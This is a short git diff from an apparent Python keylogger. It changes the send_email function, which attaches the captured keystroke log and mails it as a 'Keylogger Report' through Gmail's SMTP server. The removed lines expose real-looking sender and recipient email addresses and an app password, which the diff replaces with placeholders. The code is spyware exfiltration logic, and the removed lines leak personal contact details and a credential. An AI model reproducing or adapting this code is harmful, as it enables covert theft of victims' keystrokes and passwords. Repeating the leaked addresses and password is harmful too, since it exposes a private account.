@@ -72,8 +72,8 @@ def on_press(key):
 def send_email():
     try:
         message = MIMEMultipart()
-        message["From"] = "amineaymenbk12300@gmail.com"
-        message["To"] = "AymenBoukadida@proton.me"
+        message["From"] = "sender_email"
+        message["To"] = "recv_email"
         message["Subject"] = "Keylogger Report"
 
         with open(log_file, 'rb') as f:
@@ -86,7 +86,7 @@ def send_email():
         with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
             smtp.ehlo()
             smtp.starttls()
-            smtp.login("amineaymenbk12300@gmail.com", "sdlinunhkitnctwa")
+            smtp.login("sender_email", "app_password")
             smtp.send_message(message)
             print("Email sent")
     except Exception as e:
